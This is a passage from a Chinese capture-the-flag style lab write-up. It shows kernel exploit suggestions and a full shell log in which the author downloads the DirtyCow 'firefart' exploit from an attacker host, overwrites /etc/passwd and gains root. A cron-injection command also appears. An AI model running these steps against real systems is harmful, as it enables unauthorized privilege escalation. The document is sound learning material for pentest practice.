   Tags: RHEL=6{libuser:0.56.13-(4|5).el6},RHEL=6{libuser:0.60-5.el7},fedora=13|19|20|21|22
   Download URL: https://www.exploit-db.com/download/37706
   Comments: RHEL 5 is also vulnerable, but installed version of glibc (2.5) lacks functions needed by roothelper.c

[+] [CVE-2015-3202] fuse (fusermount)

   Details: http://seclists.org/oss-sec/2015/q2/520
   Exposure: less probable
   Tags: debian=7.0|8.0,ubuntu=*
   Download URL: https://www.exploit-db.com/download/37089
   Comments: Needs cron or system admin interaction

[+] [CVE-2014-0196] rawmodePTY

   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/33516

[+] [CVE-2013-2094] semtex

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Exposure: less probable
   Tags: RHEL=6
   Download URL: https://www.exploit-db.com/download/25444

[+] [CVE-2013-2094] perf_swevent

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Exposure: less probable
   Tags: RHEL=6,ubuntu=12.04{kernel:3.2.0-(23|29)-generic},fedora=16{kernel:3.1.0-7.fc16.x86_64},fedora=17{kernel:3.3.4-5.fc17.x86_64},debian=7{kernel:3.2.0-4-amd64}
   Download URL: https://www.exploit-db.com/download/26131
   Comments: No SMEP/SMAP bypass

[+] [CVE-2013-2094] perf_swevent 2

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Exposure: less probable
   Tags: ubuntu=12.04{kernel:3.(2|5).0-(23|29)-generic}
   Download URL: https://cyseclabs.com/exploits/vnik_v1.c
   Comments: No SMEP/SMAP bypass

[+] [CVE-2013-0268] msr

   Details: https://www.exploit-db.com/exploits/27297/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/27297

[+] [CVE-2012-0056,CVE-2010-3849,CVE-2010-3850] full-nelson

   Details: http://vulnfactory.org/exploits/full-nelson.c
   Exposure: less probable
   Tags: ubuntu=(9.10|10.10){kernel:2.6.(31|35)-(14|19)-(server|generic)},ubuntu=10.04{kernel:2.6.32-(21|24)-server}
   Download URL: http://vulnfactory.org/exploits/full-nelson.c

[+] [CVE-2010-4347] american-sign-language

   Details: https://www.exploit-db.com/exploits/15774/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/15774

[+] [CVE-2010-3904] rds

   Details: http://www.securityfocus.com/archive/1/514379
   Exposure: less probable
   Tags: debian=6.0{kernel:2.6.(31|32|34|35)-(1|trunk)-amd64},ubuntu=10.10|9.10,fedora=13{kernel:2.6.33.3-85.fc13.i686.PAE},ubuntu=10.04{kernel:2.6.32-(21|24)-generic}
   Download URL: http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c

[+] [CVE-2010-3848,CVE-2010-3850,CVE-2010-4073] half_nelson

   Details: https://www.exploit-db.com/exploits/17787/
   Exposure: less probable
   Tags: ubuntu=(10.04|9.10){kernel:2.6.(31|32)-(14|21)-server}
   Download URL: https://www.exploit-db.com/download/17787

[+] [CVE-2010-3437] pktcdvd

   Details: https://www.exploit-db.com/exploits/15150/
   Exposure: less probable
   Tags: ubuntu=10.04
   Download URL: https://www.exploit-db.com/download/15150

[+] [CVE-2010-3301] ptrace_kmod2

   Details: https://www.exploit-db.com/exploits/15023/
   Exposure: less probable
   Tags: debian=6.0{kernel:2.6.(32|33|34|35)-(1|2|trunk)-amd64},ubuntu=(10.04|10.10){kernel:2.6.(32|35)-(19|21|24)-server}
   Download URL: https://www.exploit-db.com/download/15023

[+] [CVE-2010-3081] video4linux

   Details: https://www.exploit-db.com/exploits/15024/
   Exposure: less probable
   Tags: RHEL=5
   Download URL: https://www.exploit-db.com/download/15024

[+] [CVE-2010-2959] can_bcm

   Details: https://www.exploit-db.com/exploits/14814/
   Exposure: less probable
   Tags: ubuntu=10.04{kernel:2.6.32-24-generic}
   Download URL: https://www.exploit-db.com/download/14814

[+] [CVE-2010-1146] reiserfs

   Details: https://jon.oberheide.org/blog/2010/04/10/reiserfs-reiserfs_priv-vulnerability/
   Exposure: less probable
   Tags: ubuntu=9.10
   Download URL: https://jon.oberheide.org/files/team-edward.py
   bash-4.1$ wget http://192.168.0.100:8099/40839.c -O 40839.c

bash-4.1$ wget http://192.168.0.100:8099/40839.c -O 40839.c
--2022-06-20 06:50:15--  http://192.168.0.100:8099/40839.c
Connecting to 192.168.0.100:8099... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4814 (4.7K) [text/x-csrc]
Saving to: `40839.c'

100%[======================================>] 4,814       --.-K/s   in 0s

2022-06-20 06:50:15 (806 MB/s) - `40839.c' saved [4814/4814]

bash-4.1$ ls -al
ls -al
total 116
drwxrwxrwt.  3 root   root    4096 Jun 20 06:50 .
dr-xr-xr-x. 22 root   root    4096 Jun 19 20:14 ..
drwxrwxrwt   2 root   root    4096 Jun 19 20:14 .ICE-unix
-rw-rw-rw-   1 apache apache  4814 Jun 18 13:54 40839.c
-rw-r--r--   1 admin  admin   2853 Jun 20 06:50 cronresult
-rwxrw-rw-   1 apache apache 89641 Jun 20  2022 les.sh
-rw-rw-rw-   1 apache apache    28 Jun 20 05:39 runthis
bash-4.1$ chmod u+x 40839.c
chmod u+x 40839.c
bash-4.1$ head -n 30 40839.c
head -n 30 40839.c
//
// This exploit uses the pokemon exploit of the dirtycow vulnerability
// as a base and automatically generates a new passwd line.
// The user will be prompted for the new password when the binary is run.
// The original /etc/passwd file is then backed up to /tmp/passwd.bak
// and overwrites the root account with the generated line.
// After running the exploit you should be able to login with the newly
// created user.
//
// To use this exploit modify the user values according to your needs.
//   The default is "firefart".
//
// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
//
// Compile with:
//   gcc -pthread dirty.c -o dirty -lcrypt
//
// Then run the newly create binary by either doing:
//   "./dirty" or "./dirty my-new-password"
//
// Afterwards, you can either "su firefart" or "ssh firefart@..."
//
// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
//   mv /tmp/passwd.bak /etc/passwd
//
// Exploit adopted by Christian "FireFart" Mehlmauer
// https://firefart.at
//

bash-4.1$ gcc -pthread 40839.c -o dirty -lcrypt
gcc -pthread 40839.c -o dirty -lcrypt
bash-4.1$ ls -al
ls -al
total 128
drwxrwxrwt.  3 root   root    4096 Jun 20 06:51 .
dr-xr-xr-x. 22 root   root    4096 Jun 19 20:14 ..
drwxrwxrwt   2 root   root    4096 Jun 19 20:14 .ICE-unix
-rwxrw-rw-   1 apache apache  4814 Jun 18 13:54 40839.c
-rw-r--r--   1 admin  admin   2892 Jun 20 06:51 cronresult
-rwxrwxrwx   1 apache apache 12056 Jun 20 06:51 dirty
-rwxrw-rw-   1 apache apache 89641 Jun 20  2022 les.sh
-rw-rw-rw-   1 apache apache    28 Jun 20 05:39 runthis
bash-4.1$ ./dirty
./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 123456

Complete line:
firefart:fi8RL.Us0cfSs:0:0:pwned:/root:/bin/bash

mmap: 7fea0645a000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password '123456'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
bash-4.1$ cat /etc/passwd
cat /etc/passwd
firefart:fi8RL.Us0cfSs:0:0:pwned:/root:/bin/bash
/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
saslauth:x:499:76:Saslauthd user:/var/empty/saslauth:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
vboxadd:x:498:1::/var/run/vboxadd:/bin/false
eezeepz:x:500:500::/home/eezeepz:/bin/bash
admin:x:501:501::/home/admin:/bin/bash
fristigod:x:502:502::/var/fristigod:/bin/bash
fristi:x:503:100::/var/www:/sbin/nologin
bash-4.1$ su firefart
su firefart
Password: 123456

[firefart@localhost tmp]# id
id
uid=0(firefart) gid=0(root) groups=0(root)
[firefart@localhost tmp]#
```
可以发现通过内核提权也可以直接获取到系统的最高权限，也是最直接、最暴力的方式了，但是有时候也是最耗费时间的方式(需要不停的尝试exp)。
<font color="red">我前期花费了大量事件在内核提权上，测试了很多脚本，都不能成功，借鉴了大神提醒后才使用脏牛v2版本才提权成功；正因为如此，所以个人在此再次强调一下信息收集的重要性，收集的信息越全，你的路才会更宽、更快。</font>
# Conclusion

- [ ] 有一个待解决的问题是为什么`echo "/home/admin/chmod 777 /root" > /tmp/runthis` 执行不成功
